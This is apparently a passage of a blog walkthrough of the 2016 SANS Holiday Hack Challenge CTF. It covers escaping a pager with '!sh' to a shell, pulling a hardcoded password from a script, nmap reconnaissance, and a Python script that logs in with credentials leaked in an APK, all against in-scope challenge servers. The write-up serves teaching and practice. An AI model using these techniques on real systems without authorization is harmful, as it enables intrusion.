+<p>The next door is at the top of the winding stair case. We are instructed to find the passphrase buried deep in the file contents. So magic with the find program will quickly reveal this secret. With a wildcard in the name option, we can see all the files very quickly. They tried to hide the file with hidden directories that start with a period, directories that are just a space and other special characters which make it hard to see with normal tools. As you can see below a file called key_for_the_door.txt.</p>
+
+<p><img src="/assets/images/holidayhack2016/hidden_file_panel_1.png" alt="Hiden File Panel 1" /></p>
+
+<p>We can refine our find command to be more specific for the file we want, then use the -exec option to pass that file name to the cat program. We see the passphrase is open_sesame.</p>
+
+<p><img src="/assets/images/holidayhack2016/hidden_file_panel_2.png" alt="Hidden File Panel 2" /></p>
+
+<p>This passphrase opens up the door to Santa’s office. In the office we see another panel between two bookcases, a large desk with an interesting tiny police call box, and some other furniture decorating the edges. Since we are here, lets see what these panel does.</p>
+
+<p><img src="/assets/images/holidayhack2016/santas_office.png" alt="Santa's Office" /></p>
+
+<p>We presented with a prompt that greets us as “Professor Faulken.” For those that are not children of the 80s, this is a reference to a character from the 1983 film WarGames. We can interact with the service but for all incorrect responses we are told by Joshua/WOPR that he does not understand. We must find the exact phrase it is expecting. In fact, this challenge is a more recent reference to a task in the treasure hunt in the amazing book Ready Player One by Ernest Cline. We can refer to YouTube clips to see the scene where Matthew Broderick’s characters does this exact interaction. Below you will see my interactions with the system (you have to be exact with punctuation and capitalization)</p>
+
+<p><img src="/assets/images/holidayhack2016/wargames_1.png" alt="WarGames Part 1" /></p>
+
+<p><img src="/assets/images/holidayhack2016/wargames_2.png" alt="WarGames Part 2" /></p>
+
+<p><img src="/assets/images/holidayhack2016/wargames_3.png" alt="WarGames Part 3" /></p>
+
+<p>So we have another passphrase <code class="highlighter-rouge">LOOK AT THE PRETTY LIGHTS</code> that we can use later when we find another entry point. A couple interesting points about this challenge. Early on while trying to figure out what to do, I hit <code class="highlighter-rouge">Ctrl-C</code> and was able to make the python script running to break. This bug has been fixed, but you can see the message below.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="o">^</span><span class="n">CTraceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+ <span class="n">File</span> <span class="s">"/home/elf/wargames.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">76</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+ <span class="n">response</span><span class="o">=</span><span class="nb">raw_input</span><span class="p">()</span>
+<span class="nb">KeyboardInterrupt</span>
+</code></pre>
+</div>
+
+<p>For a while, I thought we had to exploit <code class="highlighter-rouge">raw_input()</code> or possible have it catch a different signal. But it was either a bug or a red herring.</p>
+
+<p>Once I realized the interactions had to be exact (I was initially forgetting the period at the end of “Hello”), I paused the YouTube clip above at this frame to see all the responses.</p>
+
+<p><img src="/assets/images/holidayhack2016/wargames_blooper.png" alt="WarGames Blooper" /></p>
+
+<p>The problem with this shot is that its a blooper. When David Lightman (Broderick) first enters the response to the account removal question, he correctly spells mistakes but above, you see it is missing the e and period. Very ironic that the <strong>mistake</strong> was on <em>mistake</em>. I would not have put it past the folks at CounterHack to either only except this response or at least acknowledge it with another Easter Egg.</p>
+
+<p>The terminal door is the one on the train in the east wing of the workshop. This is the same location where Shinny Upatree gave us the hint about using JadX on the APK file.</p>
+
+<p><img src="/assets/images/holidayhack2016/train_door_fluxcapactior.png" alt="" /></p>
+
+<h5 id="look-closely-at-that-mob-of-people-and-you-can-see-my-friend-ryko212-who-was-busy-hacking-when-i-replayed-the-game-to-get-some-screenshots">Look closely at that mob of people and you can see my friend ryko212 who was busy hacking when I replayed the game to get some screenshots</h5>
+
+<p>This terminal brings you to a console to control the train. You are presented with a few menu options: get the train status, set the brakes, release the brakes, start the train, open the help document, or quit.</p>
+
+<p><img src="/assets/images/holidayhack2016/train_menu.png" alt="Train Menu" /></p>
+
+<p>Trying to start the train, it will tell you the brakes have to be off. Once you release the brake and try to start the train, you have to enter a password. You can try all the passwords we have seen so far in the game, but they will not work.</p>
+
+<p><img src="/assets/images/holidayhack2016/train_brakeoff_start.png" alt="Train Brake Off" /></p>
+
+<p>Checking out the help document, we get an indication that we are working in a potential vulnerable application. The highlighted path of the file in the bottom left corner is an indication we are in some version of <code class="highlighter-rouge">/usr/bin/less</code>. This application has allows you to execute other commands with the ! button. This feature exists in <code class="highlighter-rouge">less</code>, <code class="highlighter-rouge">vi</code>, <code class="highlighter-rouge">man</code> pages, and other applications.</p>
+
+<p><img src="/assets/images/holidayhack2016/train_help_screen.png" alt="Train Help" /></p>
+
+<p>With a <code class="highlighter-rouge">!sh</code> we can now get a shell on this box. We are the user <code class="highlighter-rouge">conductor</code> and we have a few interesting train files in our home directory.</p>
+
+<p><img src="/assets/images/holidayhack2016/train_shell.png" alt="Train Shell" /></p>
+
+<p>The <code class="highlighter-rouge">TrainHelper.txt</code> file is the file we were just viewing in the Help menu. The <code class="highlighter-rouge">Train_Console</code> file is the script that executes when you connect to the terminal. You can view the entire file <a href="https://raw.githubusercontent.com/wcmoody/holidayhack/master/Train_Console">here</a>, but the interesting details can be seen below:</p>
+
+<p><img src="/assets/images/holidayhack2016/train_password.png" alt="Train Password" /></p>
+
+<p>We can see that the START option, requests a password which it compares to a local variable called <code class="highlighter-rouge">$PASS</code>. This password is <code class="highlighter-rouge">24fb3e89ce2aa0ea422c3d511d40dd84</code> and if it matches it will run the <code class="highlighter-rouge">ActivateTrain</code> program. We could go back and enter the password in the console application, but lets just activate the train from here.</p>
+
+<p><img src="/assets/images/holidayhack2016/train_flux.png" alt="Train Flux Capacitor" /></p>
+
+<p>Look like this train is installed with a <em>Back to the Future</em> style Flux Capacitor that allows time travel to happen. The train has recently returned from November 16, 1978 and is currently set to return to that date. Pressing enter accelerates us to 88 mph, provides some awesome animated ascii art and takes us back to 1978! <strong>Who</strong> could possibly have traveled back in time and why? Oh the puns.</p>
+
+<p><img src="/assets/images/holidayhack2016/1978.png" alt="1978" /></p>
+
+<p>1978 North Pole greets us with a nice piece of snow art showing us the year. 1978 also has a nice sepia tint. No need to grab a newspaper to confirm the date. The creativity of the CounterHack team with 1978 is some of the most fun of the entire game. Each elf’s conversation is loaded with puns about “future” technologies and closely relates to what they tell you in 2016. For instance <strong>Holly Evergreen</strong> who in 2016 provides you the Cranbian image once you assemble all the parts, has the following to say:</p>
+
+<blockquote>
+  <blockquote>
+    <p>My aunt gave me her famous Cran Pi recipe, which seems simple - there are only five ingredients! But I don’t understand these instructions. What do you mean the heat sinks?</p>
+  </blockquote>
+</blockquote>
+
+<p>I will leave the connection of the rest of the quotes to the technology as an exercise to the reader. Some other interesting observations include the much higher count down on the “Days Since the Last Grinch-Level Event.” In 2016 it’s a counter since Christmas Eve 2015 and the ANTAS Corporations foiled plot. Doing the math and using some handy <em>days-between-dates</em> website, we see the 1978 counter measures days since the premier of <em>Dr Seuss’ How the Grinch Stole Christmas</em> television special on December 18, 1966.</p>
+
+<p><img src="/assets/images/holidayhack2016/grinch_event_1978.png" alt="Grinch Level Event 1978" /></p>
+
+<p>But my favorite pun is the poster above the bed in Elf House #2, in 2016 it was Rogue One, but in 1978 it’s the original Star Wars film, now know as Episode IV: A New Hope. Quite a commentary on current culture, when a movie that takes places immediately before another one that was released 39 years earlier.</p>
+
+<p><img src="/assets/images/holidayhack2016/star_wars_poster.png" alt="Star Wars Poster" /></p>
+
+<p>Back to the task at hand, let’s find Santa Claus. Running through all the known areas of the North Pole, we find that all previously Cranberry Pi locked doors are open, since the technology does not exist at a consumer level to provide access control. When we reach the additional reindeer pen that was previously locked by the Wumpus game, we find Santa Claus safe and sound (though a little forgetful).</p>
+
+<p><img src="/assets/images/holidayhack2016/santa_claus_rescued.png" alt="Santa Rescued" /></p>
+
+<p>Talking to the big man (<strong>I know him!</strong>), he discover he does not remember who, how, or why he was kidnapped and brought to 1978. We unlock another achievement and then the credits roll.</p>
+
+<p>This brings us to the end of Part 3.</p>
+
+<h4 id="so-the-answers-to-the-questions-for-part-three-are-">So the answers to the questions for part three are …</h4>
+
+<ul>
+  <li>
+    <p>A5: The password for the “cranpi” account on the Cranberry Pi is <code class="highlighter-rouge">yummycookies</code></p>
+  </li>
+  <li>
+    <p>A6: Each terminal door was opened as described above, and Santa was imprisoned by the villain in the reindeer pen in 1978.</p>
+  </li>
+</ul>
+
+<h3 id="part-4-my-gosh-its-full-of-holes">Part 4: My Gosh… It’s Full of Holes</h3>
+
+<p>The fun game now is all over and its time to get seriously hacking. We are now are tasked to recover 6 more additional audio files similar to the one in the Android app. Our specific instructions are:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>And yet again, Dear Reader, you are called upon to help the Dosis children, this time by exploiting various servers associated with the SantaGram application. Analyze the clues you've been provided on Santa's business card and the SantaGram APK file to identify target systems. Then, check with Tom Hessman at the North Pole to confirm that each IP address you find is included in the scope of your work. Each server has at least one flaw you can exploit to retrieve a small audio file on the system. If you get stuck, feel free to visit the elves of the North Pole for hints about various kinds of vulnerabilities and attacks you might find useful.
+
+7) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS:
+
+The Mobile Analytics Server (via credentialed login access)
+The Dungeon Game
+The Debug Server
+The Banner Ad Server
+The Uncaught Exception Handler Server
+The Mobile Analytics Server (post authentication)
+</code></pre>
+</div>
+
+<p>So we have need to find some IP addresses  and get them approved before we unleash our bits across the network. Good advice, don’t want any desk pops.</p>
+
+<p>Going back to the APK file, lets search the files or IP addresses. Using recursive grep with regular expressions lets look for any IP addresses (or at least 4 numbers separated by periods, no need to limit to range of 0-255)</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep -r -E <span class="s2">"</span><span class="se">\d</span><span class="s2">+</span><span class="se">\.\d</span><span class="s2">+</span><span class="se">\.\d</span><span class="s2">+</span><span class="se">\.\d</span><span class="s2">+"</span> <span class="k">*</span>
+com/northpolewonderland/santagram/Me.java: /<span class="k">*</span> renamed from: com.northpolewonderland.santagram.Me.3.2.1.1 <span class="k">*</span>/
+com/northpolewonderland/santagram/Me.java: /<span class="k">*</span> renamed from: com.northpolewonderland.santagram.Me.3.2.1.1.1 <span class="k">*</span>/
+com/northpolewonderland/santagram/Me.java: /<span class="k">*</span> renamed from: com.northpolewonderland.santagram.Me.3.2.1.1.1.1 <span class="k">*</span>/
+com/northpolewonderland/santagram/Me.java: /<span class="k">*</span> renamed from: com.northpolewonderland.santagram.Me.4.a.1.1.2.1 <span class="k">*</span>/
+com/northpolewonderland/santagram/PostDetails.java: /<span class="k">*</span> renamed from: com.northpolewonderland.santagram.PostDetails.5.1.1.1 <span class="k">*</span>/
+com/parse/OfflineStore.java: /<span class="k">*</span> renamed from: com.parse.OfflineStore.26.1.1.1 <span class="k">*</span>/
+com/parse/OfflineStore.java: /<span class="k">*</span> renamed from: com.parse.OfflineStore.26.1.1.2 <span class="k">*</span>/
+</code></pre>
+</div>
+
+<p>We get a few hits, but nothing that is an IP address. Now lets look for urls with domain names. Assuming they are going to have northpolewonderland as part of the domain name.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep -r -E https?:// <span class="k">*</span> | grep northpolewonderland
+AndroidManifest.xml:&lt;manifest xmlns:<span class="s2">"http://schemas.android.com/apk/res/android"</span> android:versionCode<span class="o">=</span><span class="s2">"1"</span> android:versionName<span class="o">=</span><span class="s2">"4.2"</span> <span class="nv">package</span><span class="o">=</span><span class="s2">"com.northpolewonderland.santagram"</span> <span class="nv">platformBuildVersionCode</span><span class="o">=</span><span class="s2">"23"</span> <span class="nv">platformBuildVersionName</span><span class="o">=</span><span class="s2">"6.0-2704002"</span>&gt;
+com/northpolewonderland/santagram/Configs.java:            Parse.initialize<span class="o">(</span>new Builder<span class="o">(</span>this<span class="o">)</span>.applicationId<span class="o">(</span>String.valueOf<span class="o">(</span>PARSE_APP_KEY<span class="o">))</span>.clientKey<span class="o">(</span>String.valueOf<span class="o">(</span>PARSE_CLIENT_KEY<span class="o">))</span>.server<span class="o">(</span><span class="s2">"https://www.northpolewonderland.com/parse"</span><span class="o">)</span>.build<span class="o">())</span>;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"analytics_launch_url"</span>&gt;https://analytics.northpolewonderland.com/report.php?type<span class="o">=</span>launch&lt;/string&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"analytics_usage_url"</span>&gt;https://analytics.northpolewonderland.com/report.php?type<span class="o">=</span>usage&lt;/string&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"banner_ad_url"</span>&gt;http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5&lt;/string&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span>&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"dungeon_url"</span>&gt;http://dungeon.northpolewonderland.com/&lt;/string&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"exhandler_url"</span>&gt;http://ex.northpolewonderland.com/exception.php&lt;/string&gt;
+</code></pre>
+</div>
+
+<p>Bingo. Now we got some domain names that line up with our task for Part 4. Let’s resolve these to domain names and get the Oracles approval. Some more command line Kung Fu gets us a clean list of domain names with IPs.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span><span class="k">for </span>d <span class="k">in</span> <span class="sb">`</span>grep -r -E https?:// <span class="k">*</span> | grep northpolewonderland<span class="se">\.</span>com | cut -d<span class="s1">'/'</span> -f5<span class="sb">`</span>; <span class="k">do </span>dig <span class="nv">$d</span> | grep IN | grep -E <span class="s2">"</span><span class="se">\d</span><span class="s2">+</span><span class="se">\.\d</span><span class="s2">+</span><span class="se">\.\d</span><span class="s2">+</span><span class="se">\.\d</span><span class="s2">+"</span>; <span class="k">done
+</span>analytics.northpolewonderland.com. 1283 IN A 104.198.252.157
+analytics.northpolewonderland.com. 1282 IN A 104.198.252.157
+ads.northpolewonderland.com. 1282 IN A 104.198.221.240
+dev.northpolewonderland.com. 1171 IN A 35.184.63.245
+dungeon.northpolewonderland.com. 1282 IN A 35.184.47.139
+ex.northpolewonderland.com. 1282 IN A 104.154.196.33
+</code></pre>
+</div>
+
+<p>Talking to Tom Hessman aka “The Oracle”, we get approval for all 5 IP addresses above. We go ahead and throw in the IP address for www.northpolewonderland.com and get told its in scope but only for downloading files, so that is reassuring.</p>
+
+<p>I will tackle each server in the ordered listed in the task. Assuming they get more difficult as we go, and the order of the audio files might be important.</p>
+
+<h4 id="the-mobile-analytics-server-via-credentialed-login-access">The Mobile Analytics Server (via credentialed login access)</h4>
+
+<p>The URL is <code class="highlighter-rouge">analytics.northpolewonderland.com</code> which has an IP address of <code class="highlighter-rouge">104.198.252.157</code>. We see above that there is a <code class="highlighter-rouge">report.php</code> file in the webroot, but the page is access via <code class="highlighter-rouge">https</code>. Lets see what we can do in our browser to this page.</p>
+
+<p><img src="/assets/images/holidayhack2016/analytics_login.png" alt="Analytics Login" /></p>
+
+<p>The webroot resolves to a <code class="highlighter-rouge">login.php</code> page. Using the credentials from the APK from in Part 2 {<code class="highlighter-rouge">guest</code>:<code class="highlighter-rouge">busyreindeer78</code>}, we are able to reach the home page.</p>
+
+<p><img src="/assets/images/holidayhack2016/analytics_success.png" alt="Analytics Success" /></p>
+
+<p>The top of the page we see a link to <code class="highlighter-rouge">MP3</code>. We can click this link and download the file directly. We also can use the following python requests script to automate the entire process.</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://analytics.northpolewonderland.com"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="s">'guest'</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="s">'busyreindeer78'</span><span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'/login.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span>
+
+<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">mp3</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'href'</span><span class="p">)</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'a'</span><span class="p">,</span> <span class="n">href</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="k">if</span> <span class="s">'MP3'</span> <span class="ow">in</span> <span class="n">a</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">audio</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">mp3</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="n">audio</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'content-disposition'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">output</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">audio</span><span class="o">.</span><span class="n">iter_content</span><span class="p">(</span><span class="n">chunk_size</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">chunk</span><span class="p">:</span>
+             <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"Download: </span><span class="si">%</span><span class="s">s from </span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">mp3</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>The name of the downloaded file is: <code class="highlighter-rouge">discombobulatedaudio2.mp3</code></p>
+
+<h4 id="the-dungeon-game">The Dungeon Game</h4>
+
+<p>The Dungeon server URL is <code class="highlighter-rouge">dungeon.northpolewonderland.com</code> with an IP address of <code class="highlighter-rouge">35.184.47.139</code>. Visiting the above URL we are presented with a static website with instructions for the Dungeon game.</p>
+
+<p><img src="/assets/images/holidayhack2016/dungeon_instructions.png" alt="Dungeon Instructions" /></p>
+
+<p>An elf in the north pole previously provided a link to download the binary for the dungeon game <a href="http://www.northpolewonderland.com/dungeon.zip">here</a>. We can assume the binary is running as a service on this host. Lets fire up <code class="highlighter-rouge">nmap</code> to see if its is listening on any odd ports.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>nmap 35.184.47.139
+
+Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2016-12-23 14:06 EST
+Nmap scan report <span class="k">for </span>139.47.184.35.bc.googleusercontent.com <span class="o">(</span>35.184.47.139<span class="o">)</span>
+Host is up <span class="o">(</span>0.064s latency<span class="o">)</span>.
+Not shown: 994 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+554/tcp   open  rtsp
+7070/tcp  open  realserver
+11111/tcp open  vce
+</code></pre>
+</div>
+
+<p>Checking to see what is going on at TCP port <code class="highlighter-rouge">11111</code>, we see that as expected it’s the dungeon game. Playing it a little we find a leaflet describing the game.</p>
+
+<p>Our mission is to find the elf at the North Pole and barter with him for information about holiday artifacts you need to complete your quest.
+As you enter the forest in the game, you find a tall tree. You climb up the tree to recover a jewel encrusted egg. Enter the house, explore the rooms, find a sword and a lamp. In one of the rooms a trap door can be found under a heavy rug. Enter the dungeon, explore, avoid the thief, kill a troll, and find the elf. Give the elf the egg and he gives you the following message.</p>
+
+<blockquote>
+  <blockquote>
+    <p>The elf, satisfied with the trade says -
+send email to “peppermint@northpolewonderland.com” for that which you seek. The elf says - you have conquered this challenge - the game will now end</p>
+  </blockquote>
+</blockquote>
+
+<p>After sending the email, peppermint sends back a message with an audio file attached. The message says:</p>
+
+<blockquote>
+  <blockquote>
+    <p>You tracked me down, of that I have no doubt.
+I won’t get upset, to avoid the inevitable bout.
+You have what you came for, attached to this note.
+Now go and catch your villian, and we will alike do dote.</p>
+  </blockquote>
+</blockquote>
+
+<p>The name of the attached file is:  <code class="highlighter-rouge">discombobulatedaudio3.mp3</code></p>
+
+<h4 id="the-debug-server">The Debug Server</h4>
+
+<p>The debug server domain name is <code class="highlighter-rouge">dev.northpolewonderland.com</code> and the IP address is <code class="highlighter-rouge">35.184.63.245</code>. There is an <code class="highlighter-rouge">index.php</code> file at the webroot. Opening up that URL in our web-browser returns a blank page. Let’s dive into the <em>SantaGram</em> app source code to see what is going on here.</p>
+
+<p>There is a couple of approaches we can take here. We could deploy the APK into an Android development tool like <em>Genymotion</em> or we could do some searching into the source code. We  will start with the source code first. Using command line tools again, we will look for any mention of the phase <code class="highlighter-rouge">debug</code>. Below you can see we get an indication of something going on in the <code class="highlighter-rouge">EditProfile.java</code> file. Seems it checks if remote debugging is enabled or not.</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep -ir <span class="s2">"debug"</span> <span class="k">*</span>
+android/support/v7/view/menu/C0656h.java:import android.view.ViewDebug.CapturedViewProperty;
+android/support/v7/widget/ActionMenuView.java:import android.view.ViewDebug.ExportedProperty;
+com/northpolewonderland/santagram/C0987b.java:import android.os.Debug;
+com/northpolewonderland/santagram/C0987b.java:            jSONObject2.put<span class="o">(</span><span class="s2">"natallocmem"</span>, String.valueOf<span class="o">(</span>Debug.getNativeHeapAllocatedSize<span class="o">()))</span>;
+com/northpolewonderland/santagram/EditProfile.java:            Log.i<span class="o">(</span>getString<span class="o">(</span>2131165204<span class="o">)</span>, <span class="s2">"Remote debug logging is Enabled"</span><span class="o">)</span>;
+com/northpolewonderland/santagram/EditProfile.java:            Log.i<span class="o">(</span>getString<span class="o">(</span>2131165204<span class="o">)</span>, <span class="s2">"Remote debug logging is Disabled"</span><span class="o">)</span>;
+com/northpolewonderland/santagram/EditProfile.java:                jSONObject.put<span class="o">(</span><span class="s2">"debug"</span>, getClass<span class="o">()</span>.getCanonicalName<span class="o">()</span> + <span class="s2">", "</span> + getClass<span class="o">()</span>.getSimpleName<span class="o">())</span>;
+com/northpolewonderland/santagram/EditProfile.java:                Log.e<span class="o">(</span>getString<span class="o">(</span>2131165204<span class="o">)</span>, <span class="s2">"Error posting JSON debug data: "</span> + e.getMessage<span class="o">())</span>;
+com/northpolewonderland/santagram/SplashScreen.java:import android.os.Debug;
+com/northpolewonderland/santagram/SplashScreen.java:            jSONObject2.put<span class="o">(</span><span class="s2">"natallocmem"</span>, String.valueOf<span class="o">(</span>Debug.getNativeHeapAllocatedSize<span class="o">()))</span>;
+com/parse/Parse.java:    public static final int LOG_LEVEL_DEBUG <span class="o">=</span> 3;
+com/parse/Parse.java:        String[] strArr <span class="o">=</span> new String[LOG_LEVEL_DEBUG];
+res/values/public.xml:    &lt;public <span class="nb">type</span><span class="o">=</span><span class="s2">"string"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span> <span class="nv">id</span><span class="o">=</span><span class="s2">"0x7f07001d"</span> /&gt;
+res/values/public.xml:    &lt;public <span class="nb">type</span><span class="o">=</span><span class="s2">"string"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_enabled"</span> <span class="nv">id</span><span class="o">=</span><span class="s2">"0x7f07001e"</span> /&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_collection_url"</span>&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;
+res/values/strings.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"debug_data_enabled"</span>&gt;false&lt;/string&gt;
+</code></pre>
+</div>
+
+<p>The full file can be seen <a href="https://github.com/wcmoody/holidayhack/blob/master/EditProfile.java">here</a>. But let’s look at the <code class="highlighter-rouge">onCreate()</code> function to see what is going on.</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">boolean</span> <span class="n">z</span><span class="o">;</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="mi">2130968618</span><span class="o">);</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">setRequestedOrientation</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+        <span class="n">C0987b</span><span class="o">.</span><span class="na">m4774a</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">());</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mi">2131165214</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="s">"true"</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mi">2131165204</span><span class="o">),</span> <span class="s">"Remote debug logging is Enabled"</span><span class="o">);</span>
+            <span class="n">z</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mi">2131165204</span><span class="o">),</span> <span class="s">"Remote debug logging is Disabled"</span><span class="o">);</span>
+            <span class="n">z</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">getSupportActionBar</span><span class="o">().</span><span class="na">m2632a</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">getSupportActionBar</span><span class="o">().</span><span class="na">m2636b</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">getSupportActionBar</span><span class="o">().</span><span class="na">m2631a</span><span class="o">((</span><span class="n">CharSequence</span><span class="o">)</span> <span class="s">"Edit Profile"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">f2420a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProgressDialog</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">f2420a</span><span class="o">.</span><span class="na">setTitle</span><span class="o">(</span><span class="mi">2131165208</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">f2420a</span><span class="o">.</span><span class="na">setIndeterminate</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">z</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+                <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"date"</span><span class="o">,</span> <span class="k">new</span> <span class="n">SimpleDateFormat</span><span class="o">(</span><span class="s">"yyyyMMddHHmmssZ"</span><span class="o">).</span><span class="na">format</span><span class="o">(</span><span class="n">Calendar</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">getTime</span><span class="o">()));</span>
+                <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"udid"</span><span class="o">,</span> <span class="n">Secure</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">(),</span> <span class="s">"android_id"</span><span class="o">));</span>
+                <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"debug"</span><span class="o">,</span> <span class="n">getClass</span><span class="o">().</span><span class="na">getCanonicalName</span><span class="o">()</span> <span class="o">+</span> <span class="s">", "</span> <span class="o">+</span> <span class="n">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">());</span>
